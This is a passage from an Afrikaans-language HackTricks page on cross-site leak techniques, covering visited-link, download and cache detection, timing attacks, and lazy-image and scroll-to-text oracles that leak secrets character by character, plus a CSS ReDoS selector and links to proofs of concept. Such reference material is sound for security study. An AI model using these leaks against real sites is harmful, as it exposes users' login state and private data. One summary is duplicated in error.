Ten spyte van hierdie beperkings, is dit moontlik om die besoekte toestand van 'n skakel indirek te onderskei. Een tegniek behels om die gebruiker te mislei om met 'n area te interaksie wat deur CSS be√Ønvloed word, spesifiek deur die `mix-blend-mode` eienskap te gebruik. Hierdie eienskap laat die menging van elemente met hul agtergrond toe, wat moontlik die besoekte toestand kan onthul op grond van gebruikerinteraksie.

Verder kan opsporing bereik word sonder gebruikerinteraksie deur die weergawe-tyd van skakels te benut. Aangesien blaaiers besoekte en onbesoekte skakels anders kan weergee, kan dit 'n meetbare tydverskil in weergawe inbring. 'n Bewys van konsep (PoC) is in 'n Chromium-foutverslag genoem, wat hierdie tegniek demonstreer deur verskeie skakels te gebruik om die tydverskil te versterk, wat die besoekte toestand deur tydanalise opspoorbaar maak.

Vir verdere besonderhede oor hierdie eienskappe en metodes, besoek hul dokumentasiebladsye:

* `:visited`: [MDN Dokumentasie](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [MDN Dokumentasie](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [MDN Dokumentasie](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Headers
* **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Summary:** In Google Chrome, 'n toegewyde foutbladsy word vertoon wanneer 'n bladsy geblokkeer word om op 'n cross-origin webwerf ingebed te word weens X-Frame-Options beperkings.
* **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

In Chrome, as 'n bladsy met die `X-Frame-Options` kop wat op "deny" of "same-origin" gestel is, as 'n objek ingebed word, verskyn 'n foutbladsy. Chrome keer 'n le√´ dokumentobjek (in plaas van `null`) vir die `contentDocument` eienskap van hierdie objek terug, anders as in iframes of ander blaaiers. Aanvallers kan dit benut deur die le√´ dokument op te spoor, wat moontlik inligting oor die gebruiker se toestand kan onthul, veral as ontwikkelaars die X-Frame-Options kop inkonsekwent stel, dikwels die foutbladsye oor die hoof sien. Bewustheid en konsekwente toepassing van sekuriteitskoppe is van kardinale belang om sulke lekke te voorkom.

### Download Detection

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Summary:** 'n Aanvaller kan l√™eraflaaie onderskei deur iframes te benut; voortgesette toegang tot die iframe dui op 'n suksesvolle l√™eraflaai.
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Die `Content-Disposition` kop, spesifiek `Content-Disposition: attachment`, gee die blaaiers opdrag om inhoud af te laai eerder as om dit inline te vertoon. Hierdie gedrag kan benut word om te bepaal of 'n gebruiker toegang het tot 'n bladsy wat 'n l√™eraflaai inisieer. In Chromium-gebaseerde blaaiers is daar 'n paar tegnieke om hierdie aflaai gedrag te detecteer:

1. **Aflaai-balk Monitering**:
* Wanneer 'n l√™er in Chromium-gebaseerde blaaiers afgelaai word, verskyn 'n aflaai-balk onderaan die blaaiervenster.
* Deur veranderinge in die vensterhoogte te monitor, kan aanvallers die verskyning van die aflaai-balk aflei, wat daarop dui dat 'n aflaai inisieer is.
2. **Aflaai Navigasie met Iframes**:
* Wanneer 'n bladsy 'n l√™eraflaai inisieer met die `Content-Disposition: attachment` kop, veroorsaak dit nie 'n navigasie gebeurtenis nie.
* Deur die inhoud in 'n iframe te laai en vir navigasie gebeurtenisse te monitor, is dit moontlik om te kontroleer of die inhoudsdisposisie 'n l√™eraflaai veroorsaak (geen navigasie) of nie.
3. **Aflaai Navigasie sonder Iframes**:
* Soos die iframe tegniek, behels hierdie metode die gebruik van `window.open` in plaas van 'n iframe.
* Deur navigasie gebeurtenisse in die nuutgeopende venster te monitor, kan onthul word of 'n l√™eraflaai inisieer is (geen navigasie) of of die inhoud inline vertoon word (navigasie vind plaas).

In scenario's waar slegs ingelogde gebruikers sulke aflaaie kan inisieer, kan hierdie tegnieke gebruik word om indirek die gebruiker se verifikasietoestand af te lei op grond van die blaaiers se reaksie op die aflaai versoek.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Summary:** 'n Aanvaller kan l√™eraflaaie onderskei deur iframes te benut; voortgesette toegang tot die iframe dui op 'n suksesvolle l√™eraflaai.
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (van [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Dit is waarom hierdie tegniek interessant is: Chrome het nou **cache-partitionering**, en die cache-sleutel van die nuutgeopende bladsy is: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, maar as ek 'n ngrok-bladsy oopmaak en fetch daarin gebruik, sal die cache-sleutel wees: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, die **cache-sleutel is anders**, so die cache kan nie gedeel word nie. Jy kan meer besonderhede hier vind: [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Kommentaar van [**hier**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

As 'n webwerf `example.com` 'n hulpbron van `*.example.com/resource` insluit, sal daardie hulpbron die **dieselfde cache-sleutel** h√™ asof die hulpbron direk **deur top-level navigasie aangevra** is. Dit is omdat die cache-sleutel bestaan uit top-level _eTLD+1_ en frame _eTLD+1_.

Omdat toegang tot die cache vinniger is as om 'n hulpbron te laai, is dit moontlik om te probeer om die ligging van 'n bladsy te verander en dit 20ms (byvoorbeeld) daarna te kanselleer. As die oorsprong na die stop verander is, beteken dit dat die hulpbron in die cache was.\
Of kan net **'n paar fetch na die potensieel gekapte bladsy stuur en die tyd meet wat dit neem**.

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirects
* **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Summary:** Dit is moontlik om uit te vind of 'n antwoord op 'n fetch versoek 'n omleiding is
* **Code Example**:

![](<../../.gitbook/assets/image (769).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Summary:** Dit is moontlik om te probeer om 'n hulpbron te laai en voordat dit gelaai word, word die laai onderbreek. Afhangende van of 'n fout geaktiveer word, was die hulpbron of nie in die cache nie.
* **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Gebruik _**fetch**_ en _**setTimeout**_ met 'n **AbortController** om beide te detecteer of die **hulpbron in die cache is** en om 'n spesifieke hulpbron uit die blaaiers se cache te verwyder. Boonop vind die proses plaas sonder om nuwe inhoud te cache.

### Script Pollution

* **Inclusion Methods**: HTML Elements (script)
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Summary:** Dit is moontlik om **ingeboude funksies te oorskry** en hul argumente te lees, selfs van **cross-origin script** (wat nie direk gelees kan word nie), dit kan **waardevolle inligting lek**.
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Summary:** Meet die uitvoeringstyd van 'n web met behulp van dienswerkers.
* **Code Example**:

In die gegewe scenario neem die aanvaller die inisiatief om 'n **dienswerker** binne een van hul domeine, spesifiek "attacker.com", te registreer. Vervolgens open die aanvaller 'n nuwe venster in die teikenwebwerf vanaf die hoofdokument en gee die **dienswerker** opdrag om 'n timer te begin. Terwyl die nuwe venster begin laai, navigeer die aanvaller die verwysing wat in die vorige stap verkry is na 'n bladsy wat deur die **dienswerker** bestuur word.

By die aankoms van die versoek wat in die vorige stap inisieer is, antwoord die **dienswerker** met 'n **204 (No Content)** statuskode, wat die navigasieproses effektief be√´indig. Op hierdie punt vang die **dienswerker** 'n meting van die timer wat vroe√´r in stap twee begin is. Hierdie meting word be√Ønvloed deur die duur van JavaScript wat vertragings in die navigasieproses veroorsaak.

{% hint style="warning" %}
In 'n uitvoeringstyd is dit moontlik om **netwerkfaktore** te **elimineer** om **meer presiese metings** te verkry. Byvoorbeeld, deur die hulpbronne wat deur die bladsy gebruik word, te laai voordat dit gelaai word.
{% endhint %}

### Fetch Timing

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Summary:** Gebruik [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) om die tyd te meet wat dit neem om 'n versoek uit te voer. Ander horlosies kan gebruik word.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Summary:** Gebruik [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) om die tyd te meet wat dit neem om 'n versoek uit te voer met `window.open`. Ander horlosies kan gebruik word.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) om maklik te bou en **werkvloei** te outomatiseer wat deur die w√™reld se **mees gevorderde** gemeenskapstools aangedryf word.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## With HTML or Re Injection

Hier kan jy tegnieke vind om inligting uit 'n cross-origin HTML **te injecteer**. Hierdie tegnieke is interessant in gevalle waar jy om enige rede **HTML kan injecteer maar nie JS-kode kan injecteer nie**.

### Dangling Markup

{% content-ref url="../dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](../dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Image Lazy Loading

As jy **inhoud** moet **lek** en jy kan **HTML voor die geheim byvoeg**, moet jy die **gewone dangling markup tegnieke** nagaan.\
As jy egter om enige rede **MOET** dit **karakter vir karakter** doen (miskien is die kommunikasie via 'n cache-hits), kan jy hierdie truuk gebruik.

**Beelde** in HTML het 'n "**loading**" attribuut waarvan die waarde "**lazy**" kan wees. In daardie geval sal die beeld gelaai word wanneer dit gesien word en nie terwyl die bladsy laai nie:
```html
<img src=/something loading=lazy >
```
Daarom, wat jy kan doen, is om **'n baie rommelkarakters** (Byvoorbeeld **duisende "W"s**) toe te voeg om **die webblad te vul voor die geheim of iets soos** `<br><canvas height="1850px"></canvas><br>.`\
Dan, as ons **inspuiting byvoorbeeld voor die vlag verskyn**, sal die **beeld** **gelaai** word, maar as dit **na** die **vlag** verskyn, sal die vlag + die rommel **verhoed dat dit gelaai word** (jy sal moet speel met hoeveel rommel om te plaas). Dit is wat gebeur het in [**hierdie skrywe**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

'n Ander opsie sou wees om die **scroll-to-text-fragment** te gebruik as dit toegelaat word:

#### Scroll-to-text-fragment

Maar jy laat die **bot toegang tot die bladsy** maak met iets soos
```
#:~:text=SECR
```
So die webblad sal iets soos wees: **`https://victim.com/post.html#:~:text=SECR`**

Waar post.html die aanvaller se rommelkarakters en lui laai beeld bevat en dan die geheim van die bot bygevoeg word.

Wat hierdie teks sal doen, is om die bot toegang te gee tot enige teks op die bladsy wat die teks `SECR` bevat. Aangesien daardie teks die geheim is en dit net **onder die beeld** is, sal die **beeld slegs laai as die geraamde geheim korrek is**. So daar het jy jou orakel om **die geheim karakter vir karakter te exfiltreer**.

'n Voorbeeld van kode om dit te benut: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Beeld Lui Laai Tydgebaseerd

As dit **nie moontlik is om 'n eksterne beeld te laai** wat die aanvaller kan aandui dat die beeld gelaai is nie, kan 'n ander opsie wees om te probeer om die **karakter verskeie kere te raai en dit te meet**. As die beeld gelaai word, sal al die versoeke langer neem as wanneer die beeld nie gelaai word nie. Dit is wat in die [**oplossing van hierdie skrywe**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **hier saamgevat is:**

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="../regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](../regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

As `jQuery(location.hash)` gebruik word, is dit moontlik om via tyd te ontdek **of sommige HTML-inhoud bestaan**, dit is omdat as die selektor `main[id='site-main']` nie ooreenstem nie, dit nie die res van die **selektore** hoef te kontroleer nie:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Injection

{% content-ref url="css-injection/" %}
[css-injection](css-injection/)
{% endcontent-ref %}

## Defenses

Daar is verskeie versagings aanbeveel in [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) ook in elke afdeling van die wiki [https://xsleaks.dev/](https://xsleaks.dev/). Kyk daar vir meer inligting oor hoe om teen hierdie tegnieke te beskerm.

## References

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Kyk na die [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) of die [**telegram group**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **werkvloei te outomatiseer** wat deur die w√™reld se **mees gevorderde** gemeenskapstools aangedryf word.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}
